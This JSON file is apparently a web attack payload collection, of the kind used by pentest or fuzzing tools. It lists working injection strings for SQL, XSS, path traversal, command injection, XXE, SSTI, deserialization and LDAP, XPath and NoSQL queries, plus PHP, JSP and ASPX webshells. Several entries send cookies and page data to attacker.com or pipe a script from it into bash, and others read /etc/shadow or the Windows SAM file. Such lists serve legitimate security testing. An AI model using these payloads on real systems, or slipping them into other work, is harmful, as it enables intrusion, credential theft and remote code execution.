{
  "sql_injection": {
    "error_based": {
      "mysql": [
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
        "' UNION SELECT 1,2,3,4,5,CONCAT(0x7e,user(),0x7e,database(),0x7e,version(),0x7e),7,8--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
        "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)--",
        "' OR (SELECT*FROM(SELECT name_const(version(),1),name_const(version(),1))x)--",
        "' UNION SELECT 1,2,3,4,HEX(user()),6,7,8--",
        "' AND EXP(~(SELECT*FROM(SELECT user())x))--",
        "' AND GTID_SUBSET(version(),1)--",
        "' OR JSON_KEYS((SELECT CONVERT((SELECT user()) USING utf8)))--",
        "' AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT user())x)y))--"
      ],
      "postgresql": [
        "' AND CAST((SELECT version()) AS int)--",
        "' AND CAST((SELECT current_user) AS int)--",
        "' AND CAST((SELECT current_database()) AS int)--"
      ],
      "mssql": [
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' AND 1=CONVERT(int, (SELECT user_name()))--",
        "' AND 1=CONVERT(int, (SELECT db_name()))--"
      ]
    },
    "union_based": {
      "detection": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
      ],
      "exploitation": [
        "' UNION SELECT 1,user(),database(),version(),5,6,7,8--",
        "' UNION SELECT 1,group_concat(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()--",
        "' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='users'--",
        "' UNION SELECT 1,group_concat(username,0x3a,password),3,4,5,6 FROM users--"
      ]
    },
    "blind_boolean": [
      "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
      "' AND (SELECT LENGTH(user()))>5--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--"
    ],
    "time_based": [
      "' AND IF((SELECT LENGTH(user()))>5,SLEEP(5),0)--",
      "'; WAITFOR DELAY '00:00:05'--",
      "'; SELECT pg_sleep(5)--",
      "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
    ]
  },
  "xss": {
    "basic": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>"
    ],
    "filter_bypass": [
      "<ScRiPt>alert('XSS')</ScRiPt>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">",
      "<svg/onload=alert(/XSS/)>",
      "javascript:alert('XSS')",
      "<details open ontoggle=alert('XSS')>",
      "<marquee onstart=alert('XSS')>"
    ],
    "advanced": [
      "<script>fetch('/admin',{credentials:'include'}).then(r=>r.text()).then(d=>location='http://attacker.com/?data='+btoa(d))</script>",
      "<script>document.write('<img src=\"http://attacker.com/steal?cookie='+document.cookie+'\">')</script>",
      "<script>var xhr=new XMLHttpRequest();xhr.open('GET','/api/users');xhr.send();xhr.onload=function(){location='http://attacker.com/?data='+btoa(xhr.responseText)}</script>"
    ],
    "dom_based": [
      "#<script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "data:text/html,<script>alert('XSS')</script>"
    ]
  },
  "lfi_rfi": {
    "linux": [
      "../../../../etc/passwd",
      "../../../../etc/shadow",
      "../../../../etc/hosts",
      "../../../../proc/version",
      "../../../../proc/self/environ",
      "../../../../var/log/apache2/access.log"
    ],
    "windows": [
      "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "..\\..\\..\\..\\windows\\system32\\config\\sam",
      "..\\..\\..\\..\\windows\\win.ini",
      "..\\..\\..\\..\\windows\\system.ini"
    ],
    "encoded": [
      "%2e%2e%2f%2e%2e%2f%2e%2e%2f%etc%2fpasswd",
      "....//....//....//etc/passwd",
      "..%252f..%252f..%252fetc%252fpasswd"
    ],
    "rfi": [
      "http://attacker.com/shell.txt",
      "ftp://attacker.com/shell.txt",
      "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B"
    ]
  },
  "command_injection": [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "& cat /etc/passwd",
    "; ls -la",
    "; whoami",
    "; id",
    "; uname -a",
    "; ps aux",
    "`cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; ping -c 4 attacker.com",
    "; curl http://attacker.com/shell.sh | bash"
  ],
  "file_upload": {
    "php_shells": [
      "<?php system($_GET['cmd']); ?>",
      "<?php eval($_POST['code']); ?>",
      "<?php file_put_contents('shell.php', '<?php system($_GET[\"cmd\"]); ?>'); ?>",
      "GIF89a<?php system($_GET['cmd']); ?>"
    ],
    "jsp_shells": [
      "<%@ page import=\"java.io.*\" %><% String cmd = request.getParameter(\"cmd\"); Process p = Runtime.getRuntime().exec(cmd); %>",
      "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
    ],
    "aspx_shells": [
      "<%@ Page Language=\"C#\" %><%Response.Write(System.Diagnostics.Process.Start(Request[\"cmd\"]).StandardOutput.ReadToEnd());%>",
      "<script runat=\"server\">void Page_Load(object sender, EventArgs e){Response.Write(System.Diagnostics.Process.Start(Request[\"cmd\"]).StandardOutput.ReadToEnd());}</script>"
    ]
  },
  "xxe": [
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><test>&xxe;</test>",
    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY % remote SYSTEM \"http://attacker.com/xxe.dtd\">%remote;%intern;%trick;]><test>test</test>"
  ],
  "ssti": {
    "jinja2": [
      "{{config.items()}}",
      "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}",
      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    ],
    "twig": [
      "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
      "{{7*7}}",
      "{{\"id\"|filter(\"system\")}}"
    ],
    "smarty": [
      "{php}echo `id`;{/php}",
      "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",true)}",
      "{system('id')}"
    ]
  },
  "deserialization": {
    "php": [
      "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"test\";}",
      "a:1:{i:0;O:10:\"SplFileInfo\":1:{s:8:\"\u0000*\u0000pathName\";s:11:\"/etc/passwd\";}}"
    ],
    "java": [
      "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdAAEY2FsYw==",
      "aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c7708000000100000000174000863616c632e65786574000463616c6378"
    ]
  },
  "ldap_injection": [
    "*)(uid=*",
    "*)(|(uid=*",
    "*)(&(uid=*",
    "admin)(&(password=*",
    "*))(|(uid=*"
  ],
  "xpath_injection": [
    "' or '1'='1",
    "' or 1=1 or ''='",
    "x' or name()='username' or 'x'='y",
    "' or contains(name(),'admin') or '1'='1"
  ],
  "nosql_injection": {
    "mongodb": [
      "admin'||'1'=='1",
      "'; return true; var x='",
      "{\"$where\": \"function(){return(this.username=='admin'&&this.password=='password')}\"}",
      "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}"
    ],
    "couchdb": [
      "function(doc) { if (doc.username) { emit(doc.username, doc); } }",
      "';return true;var a='"
    ]
  }
}
